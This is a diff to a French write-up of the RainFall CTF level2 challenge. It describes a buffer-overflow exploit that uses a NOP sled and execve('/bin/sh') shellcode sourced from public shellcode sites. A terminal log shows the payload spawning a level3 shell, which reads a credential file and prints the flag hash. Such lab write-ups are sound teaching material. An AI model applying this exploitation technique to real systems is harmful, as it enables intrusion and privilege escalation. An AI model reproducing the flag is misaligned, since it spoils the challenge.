@@ -37,6 +37,7 @@ Pour ca on utilise comme point d'entree `gets` pour ecrire notre payload et `str
 
 Comme le buffer est assez grand, on peux ecrire notre `shellcode` dedans, donc on cherche un shellcode pour executer execve("/bin/sh")
 [ShellStorm](https://shell-storm.org/shellcode/index.html)
+[exploit-db](https://www.exploit-db.com/shellcodes)
 
 On comble le debut de notre payload par des `nop (\x90)` instruction qui permet de passer a la suivante
 
@@ -128,8 +129,6 @@ level2@RainFall:~$ cat /var/crash/lvl2 -| ./level2
                                                  1�����/bin/s�
 id
 uid=2021(level2) gid=2021(level2) euid=2022(level3) egid=100(users) groups=2022(level3),100(users),2021(level2)
-cd /home/user/level3/.pass
-/bin/sh: 3: cd: can't cd to /home/user/level3/.pass
 cat /home/user/level3/.pass
 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
 
